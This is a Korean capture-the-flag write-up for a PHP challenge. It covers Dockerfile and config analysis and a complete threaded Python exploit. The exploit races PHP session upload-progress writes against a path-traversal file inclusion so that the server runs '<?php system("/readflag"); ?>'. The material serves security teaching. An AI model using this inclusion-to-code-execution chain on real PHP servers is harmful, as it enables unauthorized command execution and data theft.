# 접근 방법
## 1. www.conf확인
`php_admin_value[session.upload_progress.enabled] = 1` PHP는 업로드 진행 상황을 추적할 수 있게 해준다. 이 기능을 보고 갈피를 잡았다.
`session.upload_progress.cleanup` 의 기본 값은 1이다, session.upload_progress.cleanup이 켜져 있는 경우, 모든 POST 데이터를 읽는 즉시 진행률 정보를 정리하기 때문에 빈 배열이 표시된다. 이를 막기 위하여 Race condition을 사용하여야한다.

## 2. 폴더 구조 확인
```php
<?php
    $page = $_GET['page'];
    if(isset($page)){
        include("./data/".$page);
    } else {
        header("Location: /?page=1");
    }
?>
```
```Dockerfile
FROM debian:bullseye

RUN DEBIAN_FRONTEND=noninteractive apt-get update && \
    apt-get install -y \
        nginx \
        php-fpm \
        libzip-dev \
        php-zip \
    && rm -rf /var/lib/apt/lists/

RUN rm -rf /var/www/html/*
COPY config/default /etc/nginx/sites-enabled/default
COPY config/www.conf /etc/php/7.4/fpm/pool.d/www.conf

COPY flag.txt config/readflag /
RUN chown 0:1337 /flag.txt /readflag && \
    chmod 040 /flag.txt && \
    chmod 2555 /readflag

COPY src /var/www/html/

RUN ln -sf /dev/stdout /var/log/nginx/access.log && \
    ln -sf /dev/stderr /var/log/nginx/error.log

RUN find / -ignore_readdir_race -type f \( -perm -4000 -o -perm -2000 \) -not -wholename /readflag -delete
USER www-data
RUN (find --version && id --version && sed --version && grep --version) > /dev/null
USER root

EXPOSE 80
CMD /etc/init.d/php7.4-fpm start && \
    nginx -g 'daemon off;'
```
- COPY src /var/www/html/를 보고 /var/www/html/가 웹의 루트 디렉토리라는걸 확인
```
/ (root)
  ├── var
  │   ├── lib
  │   │   └── php
  │   │       └── sessions
  └── www
      └── html
          └── (current directory)
```
1. /var/www/html/data에서 시작
> php 코드에서 /data위에서 실행을 한다
- ../->/var/www/data</br>
- ../->/var/www</br>
- ../->/var</br>
- ../->/</br>
    
2. 세션 진행사항 추적 경로 확인</br>
/var/lib/php/sessions/sess_{PHPSESSID}

## 3. 익스플로잇 코드 구성
익스플로잇 코드의 로직은 다음과 같다
1. 세션 파일로 /readflag를 실행하는 코드를 작성한다
2. 세션 파일은 지워지기 때문에 위에 코드를 무한히 반복한다
3. 동시에 /?page=/../../../../var/lib/php/sessions/sess_{PHPSESSID}를 읽어, 진행률 정보가 삭제되기 전에 읽기를 시도한다

## 4. 핵심코드 설명
```python
res = requests.post(url, files={
            'PHP_SESSION_UPLOAD_PROGRESS': (None, '<?php system("/readflag"); ?>'),
            'file': ('test', 'asdf')
        }, cookies={'PHPSESSID': 'test'})
```
`'PHP_SESSION_UPLOAD_PROGRESS': (None, '<?php system("/readflag"); ?>')`</br>
PHP_SESSION_UPLOAD_PROGRESS을 이용해 진행률 정보를 추적한다, 기본적으로 파일 데이터의 형태는 다음과 같은 튜플의 형태이다</br>
`{'field_name': (filename, filecontent, contenttype, headers)}`</br>
filename에 문자열이 들어올 경우, 세션 파일이 아닌 파일 처리 로직을 따라가기 때문에, PHP_SESSION_UPLOAD_PROGRESS를 통해 추적할 수 없다, 따라서 None으로 두었다 따라서 filecontent만 전달되게 된다</br>
filecontent는 php내용으로 업로드되서 실행되게 된다 이 실행내용은 PHP_SESSION_UPLOAD_PROGRESS를 통해 기록된다</br>
`'file': ('test', 'asdf')`</br>
파일 업로드 요청시에 file필드가 비어있는 경우, 서버가 이를 유효한 요청으로 인식하지 않고, 무시하게 된다. 따라서 아무거나 넣어줬다

# 익스플로잇 코드
```py
import threading
import requests

url = "http://apb2023.cstec.kr:8000"

def session1():
    while True:
        query = url + "/?page=../../../../var/lib/php/sessions/sess_test"
        res = requests.get(query)
        if len(res.text) != 0:
            print(res.text)
            exit()

def session2():
    while True:
        res = requests.post(url, files={
            'PHP_SESSION_UPLOAD_PROGRESS': (None, '<?php system("/readflag"); ?>'),
            'file': ('test', 'asdf')
        }, cookies={'PHPSESSID': 'test'})

threading.Thread(target=session1).start()
threading.Thread(target=session2).start()
```
